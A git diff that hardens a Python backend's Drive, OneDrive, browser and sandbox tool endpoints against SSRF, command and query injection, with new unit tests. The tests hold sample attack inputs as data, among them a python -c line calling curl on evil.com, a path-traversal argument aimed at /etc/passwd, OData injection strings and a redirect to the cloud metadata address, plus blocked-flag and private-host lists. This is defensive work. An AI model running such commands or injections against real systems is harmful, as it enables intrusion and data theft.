diff --git a/python-backend/app/api/internal_mcp.py b/python-backend/app/api/internal_mcp.py
index b2bf1ebe..cfd9f98a 100644
--- a/python-backend/app/api/internal_mcp.py
+++ b/python-backend/app/api/internal_mcp.py
@@ -9,7 +9,7 @@ import logging
 import secrets
 from typing import Any, Optional
 
-from fastapi import APIRouter, Header, HTTPException
+from fastapi import APIRouter, Depends, Header, HTTPException
 from pydantic import BaseModel
 
 from app.core.config import settings
@@ -61,14 +61,13 @@ class ToolCallResponse(BaseModel):
 @router.get("/tools")
 async def list_tools(
     user_id: Optional[int] = None,
-    x_proxy_token: Optional[str] = Header(None),
+    _: None = Depends(_verify_proxy_token),
 ):
     """Return the list of available Python-native MCP tools.
 
     If user_id is provided and the user does not have an active Google
     connection, returns an empty tools list.
     """
-    await _verify_proxy_token(x_proxy_token)
 
     tools = []
     if user_id is not None:
@@ -79,7 +78,7 @@ async def list_tools(
         if has_microsoft:
             tools.extend(ONEDRIVE_TOOLS)
     else:
-        tools = GOOGLE_DRIVE_TOOLS + ONEDRIVE_TOOLS
+        pass  # No user_id — cannot verify OAuth; only browser tools added below
 
     # Browser tools are always available (no OAuth needed)
     tools.extend(BROWSER_TOOLS)
@@ -90,10 +89,9 @@ async def list_tools(
 @router.post("/tools/call")
 async def call_tool(
     body: ToolCallRequest,
-    x_proxy_token: Optional[str] = Header(None),
+    _: None = Depends(_verify_proxy_token),
 ):
     """Execute a specific MCP tool."""
-    await _verify_proxy_token(x_proxy_token)
 
     handler = TOOL_HANDLERS.get(body.name)
     if not handler:
diff --git a/python-backend/app/mcp/browser_tools_mcp.py b/python-backend/app/mcp/browser_tools_mcp.py
index dd651857..ad8b4305 100644
--- a/python-backend/app/mcp/browser_tools_mcp.py
+++ b/python-backend/app/mcp/browser_tools_mcp.py
@@ -5,20 +5,49 @@ functions invoked via the internal MCP HTTP API.
 """
 
 import logging
+import re
+import shlex
 from typing import Any
 
 import httpx
 
 from app.core.config import settings
 from app.mcp.google_drive_mcp import ToolError
+from app.services.mcp_client import _BLOCKED_HOSTS
 
 logger = logging.getLogger(__name__)
 
 # ── Constants ──────────────────────────────────────────────────────────────
 
 ALLOWED_COMMANDS = {"python", "python3", "node", "npm", "pip"}
+BLOCKED_FLAGS = {"-e", "--eval", "-c", "--command", "--exec"}
 MAX_EXEC_TIMEOUT = 300
 
+_PRIVATE_HOSTNAME_PATTERNS = [
+    re.compile(r"^localhost$", re.I),
+    re.compile(r"^127\."),
+    re.compile(r"^10\."),
+    re.compile(r"^172\.(1[6-9]|2\d|3[01])\."),
+    re.compile(r"^192\.168\."),
+    re.compile(r"^169\.254\."),
+    re.compile(r"^\[?::1\]?$"),
+    re.compile(r"\.internal$", re.I),
+    re.compile(r"\.local$", re.I),
+]
+
+
+def _validate_domains(domains: list[str]) -> list[str]:
+    """Filter out SSRF-blocked domains."""
+    safe = []
+    for domain in domains:
+        domain_lower = domain.strip().lower()
+        if domain_lower in _BLOCKED_HOSTS:
+            continue
+        if any(p.match(domain_lower) for p in _PRIVATE_HOSTNAME_PATTERNS):
+            continue
+        safe.append(domain)
+    return safe
+
 # ── Tool Definitions (MCP schema format) ──────────────────────────────────
 
 BROWSER_EXECUTE_ACTIONS_TOOL = {
@@ -90,9 +119,15 @@ async def handle_browser_execute_actions(
     **kwargs: Any,
 ) -> dict:
     """Dispatch browser actions to the Node browser tool route."""
-    gateway_url = settings.SMARTSPEC_WEB_GATEWAY_URL or "http://localhost:3000"
-    gateway_token = settings.SMARTSPEC_WEB_GATEWAY_TOKEN
+    allowed_domains = _validate_domains(allowed_domains)
+    if not allowed_domains:
+        raise ToolError("invalid_input", "No valid domains after SSRF filtering")
 
+    gateway_url = settings.SMARTSPEC_WEB_GATEWAY_URL
+    if not gateway_url:
+        raise ToolError("config_error", "SMARTSPEC_WEB_GATEWAY_URL not configured")
+
+    gateway_token = settings.SMARTSPEC_WEB_GATEWAY_TOKEN
     if not gateway_token:
         raise ToolError("config_error", "SMARTSPEC_WEB_GATEWAY_TOKEN not configured")
 
@@ -146,10 +181,16 @@ async def handle_sandbox_exec_command(
         if not capabilities.get("sandbox_command"):
             raise ToolError("capability_required", "sandbox_command capability is required")
 
-    # Command allowlist check
-    base_command = command.strip().split()[0] if command.strip() else ""
+    # Command allowlist + dangerous flag check
+    parts = shlex.split(command.strip()) if command.strip() else []
+    base_command = parts[0] if parts else ""
     if base_command not in ALLOWED_COMMANDS:
         raise ToolError("command_not_allowed", f"Command '{base_command}' is not in the allowed commands list")
+    for flag in parts[1:]:
+        if flag in BLOCKED_FLAGS:
+            raise ToolError("command_not_allowed", f"Flag '{flag}' is not allowed")
+        if ".." in flag:
+            raise ToolError("command_not_allowed", "Path traversal not allowed in command arguments")
 
     # Clamp timeout
     effective_timeout = min(timeout_seconds, MAX_EXEC_TIMEOUT)
diff --git a/python-backend/app/mcp/google_drive_mcp.py b/python-backend/app/mcp/google_drive_mcp.py
index 1d0420b4..06ef7eb8 100644
--- a/python-backend/app/mcp/google_drive_mcp.py
+++ b/python-backend/app/mcp/google_drive_mcp.py
@@ -17,6 +17,19 @@ logger = logging.getLogger(__name__)
 # File ID validation: alphanumeric, hyphens, underscores, max 256 chars
 _FILE_ID_RE = re.compile(r"^[a-zA-Z0-9_-]{1,256}$")
 
+# Safe query character whitelist (includes Thai Unicode range)
+_SAFE_QUERY_RE = re.compile(r"^[a-zA-Z0-9 .,_\-@\u0E00-\u0E7F]+$")
+
+# Safe fields for file info response (no owner emails or parent references)
+_SAFE_FILE_FIELDS = {"id", "name", "mimeType", "size", "modifiedTime", "createdTime", "webViewLink"}
+
+
+def _sanitize_drive_query(query: str) -> str:
+    """Sanitize Drive search query to prevent injection."""
+    if not _SAFE_QUERY_RE.match(query):
+        return re.sub(r"[^a-zA-Z0-9 .,_\-@\u0E00-\u0E7F]", "", query)
+    return query
+
 
 # ── Exceptions ──────────────────────────────────────────────────────────────
 
@@ -109,6 +122,7 @@ async def search_drive_files(
     from app.services.google_token_service import InvalidGrantError
 
     query = _validate_query(query)
+    query = _sanitize_drive_query(query)
 
     try:
         access_token = await _get_access_token(user_id, token_service)
@@ -392,10 +406,10 @@ async def get_drive_file_info(
 
         file_meta = drive.files().get(
             fileId=file_id,
-            fields="id,name,mimeType,size,modifiedTime,createdTime,owners,webViewLink,parents",
+            fields="id,name,mimeType,size,modifiedTime,createdTime,webViewLink",
         ).execute()
 
-        return file_meta
+        return {k: v for k, v in file_meta.items() if k in _SAFE_FILE_FIELDS}
 
     except InvalidGrantError:
         raise ToolError("token_expired", "Google account token has expired. Please reconnect.")
diff --git a/python-backend/app/mcp/onedrive_mcp.py b/python-backend/app/mcp/onedrive_mcp.py
index 37f31b1f..d36c190c 100644
--- a/python-backend/app/mcp/onedrive_mcp.py
+++ b/python-backend/app/mcp/onedrive_mcp.py
@@ -10,9 +10,12 @@ import math
 import re
 import time
 from typing import Any, Optional
+from urllib.parse import quote
 
 import httpx
 
+from app.services.mcp_client import _validate_mcp_url
+
 logger = logging.getLogger(__name__)
 
 GRAPH_BASE = "https://graph.microsoft.com/v1.0"
@@ -100,7 +103,7 @@ async def search_onedrive_files(
     try:
         access_token = await _get_access_token(user_id, token_service)
 
-        search_url = f"{GRAPH_BASE}/me/drive/root/search(q='{query}')"
+        search_url = f"{GRAPH_BASE}/me/drive/root/search(q='{quote(query, safe='')}')"
         params = {
             "$select": "id,name,file,folder,size,lastModifiedDateTime,webUrl",
             "$top": str(max_results),
@@ -139,7 +142,7 @@ async def search_onedrive_files(
     except ToolError:
         raise
     except Exception as e:
-        logger.error("onedrive_search_error: %s", str(e))
+        logger.error("onedrive_search_error: %s", type(e).__name__)
         raise
 
 
@@ -181,14 +184,20 @@ async def read_onedrive_file(
         file_name = meta.get("name", "")
         mime_type = meta.get("file", {}).get("mimeType", "")
 
-        # Download content
+        # Download content — validate redirect targets to prevent SSRF
         download_url = f"{GRAPH_BASE}/me/drive/items/{item_id}/content"
-        async with httpx.AsyncClient(follow_redirects=True) as client:
+        async with httpx.AsyncClient(follow_redirects=False) as client:
             dl_resp = await client.get(
                 download_url,
                 headers={"Authorization": f"Bearer {access_token}"},
                 timeout=30.0,
             )
+            if dl_resp.status_code in (301, 302, 307, 308):
+                location = dl_resp.headers.get("location", "")
+                ssrf_err = _validate_mcp_url(location)
+                if ssrf_err:
+                    raise ToolError("ssrf_blocked", "Download redirect blocked: target URL failed SSRF validation")
+                dl_resp = await client.get(location, headers={"Authorization": f"Bearer {access_token}"}, timeout=30.0)
 
         if dl_resp.status_code != 200:
             _handle_graph_error(dl_resp.status_code, dl_resp.text)
@@ -237,7 +246,7 @@ async def read_onedrive_file(
     except ToolError:
         raise
     except Exception as e:
-        logger.error("onedrive_read_error: %s", str(e))
+        logger.error("onedrive_read_error: %s", type(e).__name__)
         raise
 
 
@@ -265,12 +274,14 @@ async def read_excel_data(
     try:
         access_token = await _get_access_token(user_id, token_service)
 
-        # Build range URL
+        # Build range URL — URL-encode user-supplied worksheet/range to prevent injection
         worksheet = sheet_name or "Sheet1"
+        worksheet_enc = quote(worksheet, safe="")
         if cell_range:
-            range_url = f"{GRAPH_BASE}/me/drive/items/{item_id}/workbook/worksheets('{worksheet}')/range(address='{cell_range}')"
+            cell_range_enc = quote(cell_range, safe="")
+            range_url = f"{GRAPH_BASE}/me/drive/items/{item_id}/workbook/worksheets('{worksheet_enc}')/range(address='{cell_range_enc}')"
         else:
-            range_url = f"{GRAPH_BASE}/me/drive/items/{item_id}/workbook/worksheets('{worksheet}')/usedRange"
+            range_url = f"{GRAPH_BASE}/me/drive/items/{item_id}/workbook/worksheets('{worksheet_enc}')/usedRange"
 
         async with httpx.AsyncClient() as client:
             resp = await client.get(
@@ -326,7 +337,7 @@ async def read_excel_data(
     except ToolError:
         raise
     except Exception as e:
-        logger.error("onedrive_excel_error: %s", str(e))
+        logger.error("onedrive_excel_error: %s", type(e).__name__)
         raise
 
 
@@ -396,7 +407,7 @@ async def list_onedrive_folder(
     except ToolError:
         raise
     except Exception as e:
-        logger.error("onedrive_list_error: %s", str(e))
+        logger.error("onedrive_list_error: %s", type(e).__name__)
         raise
 
 
@@ -433,14 +444,16 @@ async def get_onedrive_file_info(
             _handle_graph_error(resp.status_code, resp.text)
             raise ToolError("api_error", f"Failed to get file info (HTTP {resp.status_code})")
 
-        return resp.json()
+        _SAFE_FILE_INFO_FIELDS = {"id", "name", "file", "folder", "size", "lastModifiedDateTime", "createdDateTime", "webUrl"}
+        raw = resp.json()
+        return {k: v for k, v in raw.items() if k in _SAFE_FILE_INFO_FIELDS}
 
     except InvalidGrantError:
         raise ToolError("token_expired", "Microsoft account token has expired. Please reconnect.")
     except ToolError:
         raise
     except Exception as e:
-        logger.error("onedrive_info_error: %s", str(e))
+        logger.error("onedrive_info_error: %s", type(e).__name__)
         raise
 
 
diff --git a/python-backend/tests/unit/api/test_internal_mcp_auth.py b/python-backend/tests/unit/api/test_internal_mcp_auth.py
new file mode 100644
index 00000000..f9da67c5
--- /dev/null
+++ b/python-backend/tests/unit/api/test_internal_mcp_auth.py
@@ -0,0 +1,63 @@
+"""Tests for internal MCP API auth hardening (section-02).
+
+Covers F26 (OAuth tools without user_id), F29 (Depends pattern).
+"""
+
+import inspect
+from unittest.mock import AsyncMock, patch
+
+import pytest
+from fastapi.params import Depends as DependsClass
+
+pytestmark = [pytest.mark.unit]
+
+
+class TestToolListAuth:
+    """F26: Tool list returns only browser tools when user_id is None."""
+
+    @pytest.mark.asyncio
+    async def test_no_user_id_returns_only_browser_tools(self):
+        """When user_id is None, only browser tools are returned (no Drive/OneDrive)."""
+        from app.api.internal_mcp import list_tools
+
+        with patch("app.api.internal_mcp._verify_proxy_token", AsyncMock()):
+            result = await list_tools(user_id=None)
+
+        tools = result["tools"]
+        tool_names = [t["name"] for t in tools]
+        # Browser tools should be present
+        assert "browser.execute_actions" in tool_names
+        assert "sandbox.exec_command" in tool_names
+        # OAuth-dependent tools should NOT be present
+        for name in tool_names:
+            assert "drive" not in name.lower(), f"OAuth tool '{name}' should not be listed without user_id"
+            assert "onedrive" not in name.lower(), f"OAuth tool '{name}' should not be listed without user_id"
+
+
+class TestDependsPattern:
+    """F29: _verify_proxy_token must use FastAPI Depends, not manual call."""
+
+    def test_list_tools_uses_depends(self):
+        """list_tools endpoint uses Depends() for proxy token verification."""
+        from app.api.internal_mcp import list_tools
+
+        sig = inspect.signature(list_tools)
+        # Check if any parameter has a Depends default
+        has_depends = False
+        for param in sig.parameters.values():
+            if isinstance(param.default, DependsClass):
+                has_depends = True
+                break
+        assert has_depends, "list_tools should use Depends() for proxy token verification"
+
+    def test_call_tool_uses_depends(self):
+        """call_tool endpoint uses Depends() for proxy token verification."""
+        from app.api.internal_mcp import call_tool
+
+        sig = inspect.signature(call_tool)
+        has_depends = False
+        for param in sig.parameters.values():
+            if isinstance(param.default, DependsClass):
+                has_depends = True
+                break
+        assert has_depends, "call_tool should use Depends() for proxy token verification"
diff --git a/python-backend/tests/unit/mcp/__init__.py b/python-backend/tests/unit/mcp/__init__.py
new file mode 100644
index 00000000..e69de29b
diff --git a/python-backend/tests/unit/mcp/test_browser_tools_security.py b/python-backend/tests/unit/mcp/test_browser_tools_security.py
new file mode 100644
index 00000000..a5a265a2
--- /dev/null
+++ b/python-backend/tests/unit/mcp/test_browser_tools_security.py
@@ -0,0 +1,133 @@
+"""Tests for browser tools MCP security hardening (section-02).
+
+Covers F22 (command injection), F23 (domain SSRF blocklist), F24 (localhost fallback).
+"""
+
+from unittest.mock import AsyncMock, MagicMock, patch
+
+import pytest
+
+pytestmark = [pytest.mark.unit]
+
+
+class TestCommandInjection:
+    """F22: Full command validation, not just first word."""
+
+    @pytest.mark.asyncio
+    async def test_blocks_eval_flag(self):
+        """Commands with -e or --eval flags are blocked."""
+        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError
+
+        with pytest.raises(ToolError) as exc_info:
+            await handle_sandbox_exec_command(
+                'python -c "import os; os.system(\'curl evil.com\')"',
+                user_id=1, tenant_id="t1",
+            )
+        assert "not allowed" in exc_info.value.message.lower()
+
+    @pytest.mark.asyncio
+    async def test_blocks_node_eval(self):
+        """Node with --eval is blocked despite 'node' being in allowlist."""
+        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError
+
+        with pytest.raises(ToolError) as exc_info:
+            await handle_sandbox_exec_command(
+                "node -e 'process.exit(1)'",
+                user_id=1, tenant_id="t1",
+            )
+        assert "not allowed" in exc_info.value.message.lower()
+
+    @pytest.mark.asyncio
+    async def test_blocks_path_traversal_in_args(self):
+        """Path traversal in command arguments is blocked."""
+        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command, ToolError
+
+        with pytest.raises(ToolError) as exc_info:
+            await handle_sandbox_exec_command(
+                "python ../../etc/passwd",
+                user_id=1, tenant_id="t1",
+            )
+        assert "not allowed" in exc_info.value.message.lower() or "traversal" in exc_info.value.message.lower()
+
+    @pytest.mark.asyncio
+    async def test_allows_simple_command(self):
+        """Simple allowed command without dangerous flags passes validation."""
+        from app.mcp.browser_tools_mcp import handle_sandbox_exec_command
+
+        mock_dispatcher = MagicMock()
+        mock_dispatcher.dispatch = AsyncMock(return_value="job-123")
+
+        mock_db = MagicMock()
+        mock_db.__aenter__ = AsyncMock(return_value=MagicMock())
+        mock_db.__aexit__ = AsyncMock(return_value=False)
+
+        with (
+            patch("app.core.database.get_db_context", return_value=mock_db),
+            patch("app.services.sandbox_dispatcher.SandboxDispatcher", return_value=mock_dispatcher),
+        ):
+            result = await handle_sandbox_exec_command(
+                "python script.py",
+                user_id=1, tenant_id="t1",
+            )
+        assert result["status"] == "dispatched"
+
+
+class TestDomainValidation:
+    """F23: allowed_domains must be validated against SSRF blocklist."""
+
+    @pytest.mark.asyncio
+    async def test_blocks_localhost_domain(self):
+        """localhost in allowed_domains is rejected."""
+        from app.mcp.browser_tools_mcp import _validate_domains
+
+        result = _validate_domains(["localhost", "example.com"])
+        assert "localhost" not in result
+        assert "example.com" in result
+
+    @pytest.mark.asyncio
+    async def test_blocks_metadata_ip(self):
+        """Cloud metadata IP in allowed_domains is rejected."""
+        from app.mcp.browser_tools_mcp import _validate_domains
+
+        result = _validate_domains(["169.254.169.254", "github.com"])
+        assert "169.254.169.254" not in result
+        assert "github.com" in result
+
+    @pytest.mark.asyncio
+    async def test_blocks_private_ip(self):
+        """Private IPs in allowed_domains are rejected."""
+        from app.mcp.browser_tools_mcp import _validate_domains
+
+        result = _validate_domains(["192.168.1.1", "10.0.0.1", "example.com"])
+        assert "192.168.1.1" not in result
+        assert "10.0.0.1" not in result
+        assert "example.com" in result
+
+    @pytest.mark.asyncio
+    async def test_allows_valid_public_domains(self):
+        """Valid public domains pass validation."""
+        from app.mcp.browser_tools_mcp import _validate_domains
+
+        result = _validate_domains(["example.com", "github.com"])
+        assert result == ["example.com", "github.com"]
+
+
+class TestLocalhostFallback:
+    """F24: Missing SMARTSPEC_WEB_GATEWAY_URL must raise error, not fallback."""
+
+    @pytest.mark.asyncio
+    async def test_missing_gateway_url_raises_error(self):
+        """Missing SMARTSPEC_WEB_GATEWAY_URL raises ToolError, not fallback to localhost."""
+        from app.mcp.browser_tools_mcp import handle_browser_execute_actions, ToolError
+
+        with patch("app.mcp.browser_tools_mcp.settings") as mock_settings:
+            mock_settings.SMARTSPEC_WEB_GATEWAY_URL = ""
+            mock_settings.SMARTSPEC_WEB_GATEWAY_TOKEN = "valid-token"
+
+            with pytest.raises(ToolError) as exc_info:
+                await handle_browser_execute_actions(
+                    allowed_domains=["example.com"],
+                    actions=[{"type": "navigate", "url": "https://example.com"}],
+                    user_id=1, tenant_id="t1",
+                )
+            assert "not configured" in exc_info.value.message.lower()
diff --git a/python-backend/tests/unit/mcp/test_google_drive_security.py b/python-backend/tests/unit/mcp/test_google_drive_security.py
new file mode 100644
index 00000000..3575b5cd
--- /dev/null
+++ b/python-backend/tests/unit/mcp/test_google_drive_security.py
@@ -0,0 +1,76 @@
+"""Tests for Google Drive MCP security hardening (section-02).
+
+Covers F13 (query injection), F15 (response filtering).
+"""
+
+from unittest.mock import AsyncMock, MagicMock, patch
+
+import pytest
+
+pytestmark = [pytest.mark.unit]
+
+
+class TestQuerySanitization:
+    """F13: Drive search query must reject injection operators."""
+
+    def test_rejects_or_operator(self):
+        """Query with OR operator is sanitized."""
+        from app.mcp.google_drive_mcp import _sanitize_drive_query
+
+        result = _sanitize_drive_query("x' or '1'='1")
+        assert "'" not in result
+        assert "=" not in result
+
+    def test_allows_safe_characters(self):
+        """Query with only safe characters passes unchanged."""
+        from app.mcp.google_drive_mcp import _sanitize_drive_query
+
+        safe_query = "meeting notes 2026-03-01"
+        assert _sanitize_drive_query(safe_query) == safe_query
+
+    def test_allows_thai_characters(self):
+        """Thai characters in query are preserved."""
+        from app.mcp.google_drive_mcp import _sanitize_drive_query
+
+        thai_query = "รายงานการประชุม"
+        assert _sanitize_drive_query(thai_query) == thai_query
+
+
+class TestResponseFiltering:
+    """F15: File info response must not include owner emails."""
+
+    @pytest.mark.asyncio
+    async def test_file_info_excludes_owner_emails(self):
+        """get_drive_file_info does not return owner email addresses."""
+        from app.mcp.google_drive_mcp import get_drive_file_info
+
+        mock_file_meta = {
+            "id": "file123",
+            "name": "report.docx",
+            "mimeType": "application/vnd.google-apps.document",
+            "size": "1024",
+            "modifiedTime": "2026-01-01T00:00:00Z",
+            "createdTime": "2025-12-01T00:00:00Z",
+            "webViewLink": "https://docs.google.com/...",
+            "owners": [{"emailAddress": "owner@example.com", "displayName": "Owner"}],
+            "parents": ["parent-folder-id"],
+        }
+
+        mock_drive = MagicMock()
+        mock_drive.files.return_value.get.return_value.execute.return_value = mock_file_meta
+
+        with (
+            patch("app.mcp.google_drive_mcp._get_access_token", AsyncMock(return_value="token")),
+            patch("app.mcp.google_drive_mcp._build_drive_service", return_value=mock_drive),
+        ):
+            result = await get_drive_file_info("file123", user_id=1, tenant_id="t1")
+
+        # Safe fields present
+        assert "id" in result
+        assert "name" in result
+        assert "webViewLink" in result
+        # Sensitive fields filtered
+        assert "owners" not in result
+        assert "parents" not in result
+        # No email in the result at all
+        assert "owner@example.com" not in str(result)
diff --git a/python-backend/tests/unit/mcp/test_onedrive_mcp_security.py b/python-backend/tests/unit/mcp/test_onedrive_mcp_security.py
new file mode 100644
index 00000000..dcbb31ee
--- /dev/null
+++ b/python-backend/tests/unit/mcp/test_onedrive_mcp_security.py
@@ -0,0 +1,170 @@
+"""Tests for OneDrive MCP security hardening (section-02).
+
+Covers F16 (OData injection), F17 (path injection), F18 (response filtering),
+F19 (exception message leakage), F20 (redirect SSRF).
+"""
+
+import re
+from unittest.mock import AsyncMock, MagicMock, patch
+from urllib.parse import quote
+
+import httpx
+import pytest
+
+pytestmark = [pytest.mark.unit]
+
+
+class TestODataInjection:
+    """F16: Search query must be URL-encoded to neutralize OData injection."""
+
+    @pytest.mark.asyncio
+    async def test_search_query_url_encoded(self):
+        """Single quote injection in search query is neutralized."""
+        from app.mcp.onedrive_mcp import search_onedrive_files
+
+        mock_resp = MagicMock()
+        mock_resp.status_code = 200
+        mock_resp.json.return_value = {"value": []}
+
+        mock_client = MagicMock()
+        mock_client.get = AsyncMock(return_value=mock_resp)
+
+        with (
+            patch("app.mcp.onedrive_mcp._get_access_token", AsyncMock(return_value="token")),
+            patch("app.mcp.onedrive_mcp.httpx.AsyncClient") as mock_factory,
+        ):
+            mock_factory.return_value.__aenter__ = AsyncMock(return_value=mock_client)
+            mock_factory.return_value.__aexit__ = AsyncMock(return_value=False)
+
+            await search_onedrive_files("') or ('", user_id=1, tenant_id="t1")
+
+        # Verify the URL contains encoded characters, not raw single quotes
+        call_args = mock_client.get.call_args
+        url = call_args.args[0] if call_args.args else call_args.kwargs.get("url", "")
+        # The query inside search(q='...') should be URL-encoded
+        assert "') or ('" not in url
+        assert quote("') or ('", safe="") in url or "%27" in url
+
+
+class TestExcelPathInjection:
+    """F17: Worksheet and cell_range must be URL-encoded in Excel URLs."""
+
+    @pytest.mark.asyncio
+    async def test_sheet_name_url_encoded(self):
+        """Sheet name with injection chars is URL-encoded."""
+        from app.mcp.onedrive_mcp import read_excel_data
+
+        mock_resp = MagicMock()
+        mock_resp.status_code = 200
+        mock_resp.json.return_value = {"values": [["A", "B"], [1, 2]]}
+
+        mock_client = MagicMock()
+        mock_client.get = AsyncMock(return_value=mock_resp)
+
+        with (
+            patch("app.mcp.onedrive_mcp._get_access_token", AsyncMock(return_value="token")),
+            patch("app.mcp.onedrive_mcp.httpx.AsyncClient") as mock_factory,
+        ):
+            mock_factory.return_value.__aenter__ = AsyncMock(return_value=mock_client)
+            mock_factory.return_value.__aexit__ = AsyncMock(return_value=False)
+
+            await read_excel_data(
+                "valid-item-id", user_id=1, tenant_id="t1",
+                sheet_name="') or true or ('",
+                credit_charge_fn=AsyncMock(),
+            )
+
+        url = mock_client.get.call_args.args[0]
+        assert "') or true or ('" not in url
+
+    @pytest.mark.asyncio
+    async def test_cell_range_path_traversal_blocked(self):
+        """Cell range with path traversal chars is URL-encoded."""
+        from app.mcp.onedrive_mcp import read_excel_data, ToolError
+
+        # Cell range with slashes should fail validation
+        with pytest.raises(ToolError):
+            await read_excel_data(
+                "valid-item-id", user_id=1, tenant_id="t1",
+                cell_range="A1:B2/../../admin",
+            )
+
+
+class TestResponseFiltering:
+    """F18: File info response filtered to safe subset."""
+
+    @pytest.mark.asyncio
+    async def test_file_info_filters_sensitive_fields(self):
+        """get_onedrive_file_info returns only safe fields."""
+        from app.mcp.onedrive_mcp import get_onedrive_file_info
+
+        full_response = {
+            "id": "abc123",
+            "name": "doc.docx",
+            "size": 1024,
+            "lastModifiedDateTime": "2026-01-01",
+            "createdDateTime": "2025-12-01",
+            "webUrl": "https://onedrive.live.com/...",
+            "file": {"mimeType": "application/docx"},
+            "parentReference": {"driveId": "secret-drive-id", "path": "/root/private"},
+            "createdBy": {"user": {"email": "user@example.com"}},
+            "lastModifiedBy": {"user": {"email": "admin@example.com"}},
+        }
+
+        mock_resp = MagicMock()
+        mock_resp.status_code = 200
+        mock_resp.json.return_value = full_response
+
+        mock_client = MagicMock()
+        mock_client.get = AsyncMock(return_value=mock_resp)
+
+        with (
+            patch("app.mcp.onedrive_mcp._get_access_token", AsyncMock(return_value="token")),
+            patch("app.mcp.onedrive_mcp.httpx.AsyncClient") as mock_factory,
+        ):
+            mock_factory.return_value.__aenter__ = AsyncMock(return_value=mock_client)
+            mock_factory.return_value.__aexit__ = AsyncMock(return_value=False)
+
+            result = await get_onedrive_file_info("valid-item-id", user_id=1, tenant_id="t1")
+
+        # Safe fields present
+        assert "id" in result
+        assert "name" in result
+        # Sensitive fields filtered out
+        assert "parentReference" not in result
+        assert "createdBy" not in result
+        assert "lastModifiedBy" not in result
+
+
+class TestRedirectSSRF:
+    """F20: File download must not follow redirects to internal IPs."""
+
+    @pytest.mark.asyncio
+    async def test_download_redirect_to_metadata_blocked(self):
+        """Redirect to cloud metadata endpoint is blocked."""
+        from app.mcp.onedrive_mcp import read_onedrive_file, ToolError
+
+        # First request returns metadata (for file info)
+        meta_resp = MagicMock()
+        meta_resp.status_code = 200
+        meta_resp.json.return_value = {"name": "test.txt", "file": {"mimeType": "text/plain"}, "size": 100}
+
+        # Second request returns redirect to metadata endpoint
+        redirect_resp = MagicMock()
+        redirect_resp.status_code = 302
+        redirect_resp.headers = {"location": "http://169.254.169.254/latest/meta-data/"}
+
+        mock_client = MagicMock()
+        mock_client.get = AsyncMock(side_effect=[meta_resp, redirect_resp])
+
+        with (
+            patch("app.mcp.onedrive_mcp._get_access_token", AsyncMock(return_value="token")),
+            patch("app.mcp.onedrive_mcp.httpx.AsyncClient") as mock_factory,
+        ):
+            mock_factory.return_value.__aenter__ = AsyncMock(return_value=mock_client)
+            mock_factory.return_value.__aexit__ = AsyncMock(return_value=False)
+
+            with pytest.raises(ToolError) as exc_info:
+                await read_onedrive_file("valid-item-id", user_id=1, tenant_id="t1")
+
+            assert "blocked" in exc_info.value.message.lower() or "ssrf" in exc_info.value.code.lower()
